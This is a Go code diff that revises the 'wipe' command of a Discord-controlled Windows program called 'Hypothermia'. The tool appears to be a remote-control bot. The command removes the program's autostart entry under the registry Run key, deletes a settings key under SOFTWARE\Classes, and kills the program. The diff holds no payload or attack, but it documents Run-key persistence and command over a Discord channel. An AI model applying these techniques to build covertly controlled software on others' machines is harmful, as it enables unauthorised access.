@@ -16,11 +16,12 @@ import (
 )
 
 const (
-	wipeRegError    string = "🟥 Failed to get registry key."
-	wipeDeReglError string = "🟥 Failed to delete registry key."
-	wipePathError   string = "🟥 Failed to get the path."
-	wipeDelError    string = "🟥 Failed to delete hypothermia."
-	wipeKillError   string = "🟥 Failed to kill hypothermia."
+	wipeRegError       string = "🟥 Failed to get startup value."
+	wipeDelRegError    string = "🟥 Failed to delete startup value."
+	wipeDelRegKeyError string = "🟥 Failed to delete settings key."
+	wipePathError      string = "🟥 Failed to get the path."
+	wipeDelError       string = "🟥 Failed to delete hypothermia."
+	wipeKillError      string = "🟥 Failed to kill hypothermia."
 
 	wipeSoftKill string = "🟩 Hypothermia soft killed, will startup on device reset."
 )
@@ -34,7 +35,8 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 
 	if !config.Debugging && !kill {
 		checked := false
-		_, err := utils.GetRegistry(
+
+		_, err := utils.GetRegistryVal(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 			config.HypothermiaName,
 		)
@@ -44,14 +46,19 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 			s.ChannelMessageSendReply(m.ChannelID, wipeRegError, m.Reference())
 		}
 
-		err = utils.DelRegistry(
+		err = utils.DelRegistryVal(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 			config.HypothermiaName,
 		)
 
 		if err != nil && !checked {
-			s.ChannelMessageSendReply(m.ChannelID, wipeDeReglError, m.Reference())
+			s.ChannelMessageSendReply(m.ChannelID, wipeDelRegError, m.Reference())
 			return
+		}
+
+		err = utils.DelRegistryKey("SOFTWARE\\Classes\\" + config.SettingsName)
+		if err != nil {
+			s.ChannelMessageSendReply(m.ChannelID, wipeDelRegError, m.Reference())
 		}
 	}
 
